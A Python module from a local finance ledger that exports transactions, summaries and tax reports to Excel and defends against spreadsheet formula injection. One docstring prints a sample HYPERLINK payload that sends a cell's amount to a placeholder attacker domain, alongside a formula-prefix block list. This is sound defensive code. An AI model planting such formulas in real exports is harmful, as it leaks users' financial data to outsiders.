"""
[INPUT]: 依赖 finance 单连接的交易、账户、分类和税务设置投影。
[OUTPUT]: 对外提供明细/汇总与税务 XLSX 字节流；只在实际导出时延迟导入 openpyxl。
[POS]: finance 的导出边界；账户期末余额与 views 的资产/负债口径同源，
       缺依赖转为 DomainError，不把可选包变成服务启动依赖。
       导出是账本唯一的出网面：库里的字符串一旦离开本机就落进别人的电子表格引擎，
       因此所有写行都收口在 _append，由它把公式诱饵钉成文本。
[PROTOCOL]: 变更时更新此头部，然后检查 CLAUDE.md
"""

from __future__ import annotations

import io
import sqlite3
from collections import defaultdict
from datetime import datetime
from typing import Any

from core.errors import DomainError
from core.clock import record_timezone
from domains.finance.store import list_categories, load_ledger_settings, row_to_transaction
from domains.finance.views import (
    account_ownership_map, category_id_and_name, convert_from_base_currency, exchange_context,
    list_accounts, normalize_view_param, transaction_amount_in_base, transaction_belongs_to_view,
)


def _openpyxl() -> tuple[Any, Any, Any, Any]:
    try:
        from openpyxl import Workbook
        from openpyxl.styles import Alignment, Font, PatternFill
        from openpyxl.utils import get_column_letter
    except ImportError as exc: raise DomainError("export_dependency_missing", "缺少 openpyxl，无法导出 Excel。", status=503) from exc
    return Workbook, Alignment, Font, PatternFill, get_column_letter


def _transactions(connection: sqlite3.Connection, view: str, from_date: str | None = None, to_date: str | None = None) -> list[dict[str, Any]]:
    records = [row_to_transaction(row) for row in connection.execute("SELECT * FROM transactions WHERE deleted_at IS NULL ORDER BY occurred_at DESC,created_at DESC")]
    ownership = account_ownership_map(connection); view = normalize_view_param(view)
    return [item for item in records if transaction_belongs_to_view(item, view, ownership) and (not from_date or item["occurredAt"][:10] >= from_date) and (not to_date or item["occurredAt"][:10] <= to_date)]


def _style(workbook: Any) -> tuple[Any, Any, Any, Any, Any]:
    _, Alignment, Font, PatternFill, get_column_letter = _openpyxl(); return Font(name="PingFang SC",bold=True,color="FFFFFF",size=11), PatternFill("solid",fgColor="CC785C"), Alignment(horizontal="left",vertical="center"), get_column_letter, '_-¥* #,##0.00_-;-¥* #,##0.00;_-¥* "-"_-'


_FORMULA_BAIT = ("=", "+", "-", "@", "\t", "\r")


def _append(sheet: Any, values: list[Any]) -> None:
    """唯一的写行入口：凡是「长得像公式」的字符串一律钉成文本。

    「标题」「商户」「备注」在微信/支付宝账单里是**任何陌生人都能填**的字段，
    一条 `=HYPERLINK("http://evil/?x="&A2,"发票")` 经导入落库后，导出的单元格就是活公式；
    用户把报税表发给会计，对方一点就把同行金额回传给攻击者域名（老 Excel 还能用 DDE 起进程）。
    只钉字符串：金额、笔数是 float，负数不会以字符串 '-' 开头，绝不受波及。
    钉法是 data_type='s' + quotePrefix——单元格里存的仍是原文，
    Excel 与 Numbers 显示的也是原文（quotePrefix 是样式位不是字符），用户看不到多出来的引号；
    quotePrefix 还挡住第二跳：用户在 Excel 里复制/重编辑这格时不会被重新解析成公式。
    """
    sheet.append(values)
    for cell in sheet[sheet.max_row]:
        text = cell.value
        if isinstance(text, str) and (text[:1] in _FORMULA_BAIT or text.lstrip()[:1] in _FORMULA_BAIT):
            cell.data_type, cell.quotePrefix = "s", True


def _header(sheet: Any, values: list[str], font: Any, fill: Any, alignment: Any) -> None:
    _append(sheet, values)
    for cell in sheet[1]: cell.font, cell.fill, cell.alignment = font, fill, alignment


def _in_account_currency(item: dict[str, Any], account_currency: str, base_currency: str, rates: dict[str, Any]) -> float:
    """把一笔交易换算成指定账户自己币种的金额；同币种原样返回，不引入舍入。"""
    row_currency = str(item.get("currency") or account_currency).upper()
    if row_currency == account_currency: return float(item.get("amount") or 0)
    base = transaction_amount_in_base(item, base_currency, rates)
    return round(convert_from_base_currency(base, account_currency, base_currency, rates), 2)


def build_export_workbook(connection: sqlite3.Connection, view: str = "combined", from_date: str | None = None, to_date: str | None = None) -> bytes:
    Workbook, _, _, _, _ = _openpyxl(); font, fill, alignment, column, money = _style(Workbook)
    items, workbook = _transactions(connection,view,from_date,to_date), Workbook(); details = workbook.active; details.title="明细"
    _header(details,["日期","时间","类型","标题","金额","主账户","出账账户","入账账户","分类","分组","项目","标签","商户","备注","报销状态","来源"],font,fill,alignment)
    labels={"income":"收入","expense":"支出","transfer":"转账"}
    for item in items:
        category=item.get("category") or {}; amount=float(item.get("amount") or 0) * (-1 if item.get("kind")=="expense" else 1)
        _append(details,[item["occurredAt"][:10],item["occurredAt"][11:19],labels.get(item["kind"],item["kind"]),item["title"],amount,item["accountName"],item.get("fromAccountName") or "",item.get("toAccountName") or "",category_id_and_name(category)[1],category.get("group","") if isinstance(category,dict) else "",item.get("projectName") or "","、".join(item.get("tags") or []),item.get("merchant") or "",item.get("note") or "",item.get("reimbursementStatus") or "",item.get("sourceName") or item.get("source") or ""])
    for i,width in enumerate([12,10,8,26,12,14,14,14,12,14,12,18,18,28,12,12],1): details.column_dimensions[column(i)].width=width
    for row in range(2,details.max_row+1): details.cell(row,5).number_format=money
    base_currency, rates = exchange_context(connection)
    _base = lambda item: transaction_amount_in_base(item, base_currency, rates)
    monthly=workbook.create_sheet("月度汇总"); _header(monthly,["月份","收入","支出","结余","转账总额","笔数"],font,fill,alignment); totals: dict[str,dict[str,float]] = defaultdict(lambda:{"income":0.,"expense":0.,"transfer":0.,"count":0.})
    # 月度与分类都是跨账户口径，必须按本位币结算；裸加原币会把 1000 元 + 1000 美元算成 2000，
    # 而同一份数字在面板上已经按本位币显示——导出与面板对同一个月给出两个答案是不可接受的。
    for item in items: totals[item["occurredAt"][:7]][item["kind"]]+=_base(item); totals[item["occurredAt"][:7]]["count"]+=1
    for month,data in sorted(totals.items(),reverse=True): _append(monthly,[month,data["income"],data["expense"],data["income"]-data["expense"],data["transfer"],data["count"]])
    for row in range(2,monthly.max_row+1):
        for col in range(2,6): monthly.cell(row,col).number_format=money
    categories=workbook.create_sheet("分类汇总"); _header(categories,["分类","分组","笔数","总流入","总流出","净额","平均单笔"],font,fill,alignment); grouped: dict[str,dict[str,Any]]=defaultdict(lambda:{"group":"","count":0,"income":0.,"expense":0.})
    for item in items:
        category=item.get("category") or {}; name=category_id_and_name(category)[1] or "未分类"; grouped[name]["group"] = category.get("group","") if isinstance(category,dict) else ""; grouped[name]["count"]+=1; grouped[name][item["kind"] if item["kind"] in {"income","expense"} else "income"] += _base(item) if item["kind"]!="transfer" else 0
    for name,data in sorted(grouped.items(),key=lambda pair:pair[1]["income"]+pair[1]["expense"],reverse=True): _append(categories,[name,data["group"],data["count"],data["income"],data["expense"],data["income"]-data["expense"],(data["income"]+data["expense"])/max(data["count"],1)])
    accounts=workbook.create_sheet("账户汇总"); _header(accounts,["账户","归属","类型","期初余额","流入合计","流出合计","期末余额","笔数"],font,fill,alignment); flows: dict[str,dict[str,float]]=defaultdict(lambda:{"in":0.,"out":0.,"count":0.})
    currency_of={str(a.get("name") or ""):str(a.get("currency") or base_currency).upper() for a in list_accounts(connection)}
    for item in items:
        source,target=item.get("fromAccountName"),item.get("toAccountName")
        # 流入流出必须落到**各自账户的币种**，与 views.current_balance_for_account 同源：
        # 一笔 1000 USD 的跨币种转账，出账端是 1000 USD、入账端是 7200 CNY，不是两边都 1000。
        # 两端各算各的，期末余额才与面板真源一致。
        if item["kind"] in {"expense","transfer"} and source:
            flows[source]["out"]+=abs(_in_account_currency(item, currency_of.get(source, base_currency), base_currency, rates)); flows[source]["count"]+=1
        if item["kind"] in {"income","transfer"} and target:
            flows[target]["in"]+=abs(_in_account_currency(item, currency_of.get(target, base_currency), base_currency, rates)); flows[target]["count"]+=1
    for item in list_accounts(connection):
        if item.get("deletedAt"): continue
        flow=flows[item.get("name") or ""]; opening=float(item.get("openingBalance") or 0)
        # 负债账户的余额口径与资产相反：刷卡（流出）增加欠款，还款（流入）减少欠款。
        # 期初列本来就是负债口径（正数 = 欠款），期末列却一直套资产公式，
        # 于是同一张表里两列互不相容——用户拿这份 XLSX 核对信用卡账单，欠款少算两倍刷卡额。
        # 口径必须与 views.current_balance_for_account 同源，否则导出与面板互相打架。
        closing=opening-flow["in"]+flow["out"] if item.get("classification")=="liability" else opening+flow["in"]-flow["out"]
        _append(accounts,[item.get("name"),item.get("ownership","unspecified"),item.get("uiAccountType") or item.get("type") or "",opening,flow["in"],flow["out"],closing,flow["count"]])
    # 说明页同样过 _append：view/from/to 直接来自 query，日期闸只查长度与两个短横，
    # 「-999-12-01」这种以 '-' 开头的串能原样落进 B 列。
    note=workbook.create_sheet("说明"); _header(note,["项","值"],font,fill,alignment); _append(note,["视角",normalize_view_param(view)]); _append(note,["起始日期",from_date or "（无限制）"]); _append(note,["截止日期",to_date or "（无限制）"]); _append(note,["导出时间",datetime.now(record_timezone()[0]).isoformat()]); _append(note,["明细笔数",len(items)])
    buffer=io.BytesIO(); workbook.save(buffer); return buffer.getvalue()


def build_tax_report_workbook(connection: sqlite3.Connection, year: int, quarter: int | None = None) -> bytes:
    Workbook, _, _, _, _ = _openpyxl(); font,fill,alignment,column,money=_style(Workbook)
    if quarter in {1,2,3,4}: start=(quarter-1)*3+1; end=start+2; from_date=f"{year:04d}-{start:02d}-01"; import calendar; to_date=f"{year:04d}-{end:02d}-{calendar.monthrange(year,end)[1]:02d}"; period=f"{year} 年 Q{quarter}"
    else: from_date,to_date,period=f"{year:04d}-01-01",f"{year:04d}-12-31",f"{year} 年全年"
    base_currency, rates = exchange_context(connection)
    _base = lambda item: transaction_amount_in_base(item, base_currency, rates)
    items=_transactions(connection,"combined",from_date,to_date); by_tax: dict[str,list[dict[str,Any]]]=defaultdict(list)
    for item in items: by_tax[item.get("taxCategory") or "personal"].append(item)
    workbook=Workbook()
    def write(sheet: Any, label: str, rows: list[dict[str,Any]]) -> None:
        sheet.title=label; _header(sheet,["日期","类型","标题","金额","账户","对方 / 商户","项目","备注"],font,fill,alignment)
        for item in rows: _append(sheet,[item["occurredAt"][:10],item["kind"],item["title"],float(item["amount"] or 0),item["accountName"],item["merchant"],item.get("projectName") or "",item.get("note") or ""])
    first=workbook.active; write(first,"1.业务收入",by_tax["business-income"]); write(workbook.create_sheet(),"2.可抵扣支出",by_tax["business-expense-deductible"]); write(workbook.create_sheet(),"3.不可抵扣",by_tax["business-expense-nondeductible"])
    # 税务汇总跨账户求和，必须按本位币结算——明细页逐行仍显示原币，两者口径不同是刻意的。
    income=sum(_base(item) for item in by_tax["business-income"]); deductible=sum(_base(item) for item in by_tax["business-expense-deductible"]); config=load_ledger_settings(connection).get("taxConfig") or {}; profit=income-deductible; vat=coerce_number(config.get("vatRate"),.03); threshold=coerce_number(config.get("personalThreshold"),60000); personal=coerce_number(config.get("personalRate"),.2); seb=coerce_number(config.get("sebRate"),.1)
    summary=workbook.create_sheet("4.汇总"); _header(summary,[f"{period} · 报税汇总（仅供参考）"],font,fill,alignment)
    for label,value in [("业务收入合计",income),("可抵扣支出合计",deductible),("净利润（收入 − 可抵扣）",profit),(f"预估增值税（按 {vat*100:.2f}%）",max(income,0)*vat),(f"应税利润（净利润 − 起征点 {threshold:.0f}）",max(profit-threshold,0)),(f"预估个税（按 {personal*100:.2f}%）",max(profit-threshold,0)*personal),(f"预估社保 / 公积金（按 {seb*100:.2f}%）",max(profit,0)*seb)]: _append(summary,[label,value]); summary.cell(summary.max_row,2).number_format=money
    notes=workbook.create_sheet("5.说明"); _header(notes,["字段说明 / 注意事项"],font,fill,alignment); _append(notes,["本数据由本地财务管理系统按交易的税务分类聚合生成，仅供参考。"]); _append(notes,[f"统计区间：{from_date} 至 {to_date}"]); _append(notes,["请以专业税务人员意见与税务局核定数据为准。"])
    buffer=io.BytesIO(); workbook.save(buffer); return buffer.getvalue()


def coerce_number(value: object, fallback: float) -> float:
    try: return float(value)
    except (TypeError,ValueError): return fallback
